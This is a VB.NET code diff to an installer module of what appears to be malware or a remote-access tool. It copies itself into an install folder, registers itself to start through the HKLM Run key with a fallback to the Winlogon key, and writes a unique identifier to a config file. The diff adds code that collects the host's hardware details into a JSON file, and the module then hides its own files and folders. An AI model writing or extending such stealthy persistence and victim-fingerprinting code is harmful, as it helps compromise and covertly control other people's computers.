@@ -18,8 +18,11 @@ Module Installing
             }
             Copy_filesExept(installPath, ExeptFiles)
             Copy_directories(installPath)
-            Set_registry("Software\Microsoft\Windows NT\CurrentVersion\Winlogon\", installPath & "\" & GetMainFile())
-            My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue(GetMainFile(), installPath)
+            Try
+                My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue(GetMainFile(), installPath)
+            Catch ex As Exception
+                Set_registry("Software\Microsoft\Windows NT\CurrentVersion\Winlogon\", installPath & "\" & GetMainFile())
+            End Try
             Dim config As New ConfigModel With {
                 .KeyUnique = RandomString(10, 10),
                 .KeyCertified = Main.Config.Variables.CertifiedKey,
@@ -28,6 +31,9 @@ Module Installing
             }
             Dim jsonString As String = JsonConvert.SerializeObject(config)
             Write_file(Get_JsonFilewithPath(), jsonString)
+            Dim hardwares As New HardwareCollector
+            Dim jsonHardwares As String = JsonConvert.SerializeObject(hardwares)
+            Write_file(installPath & "/hardwares.json", jsonHardwares)
             Hide_files(installPath)
             Hide_directories(installPath)
         End If
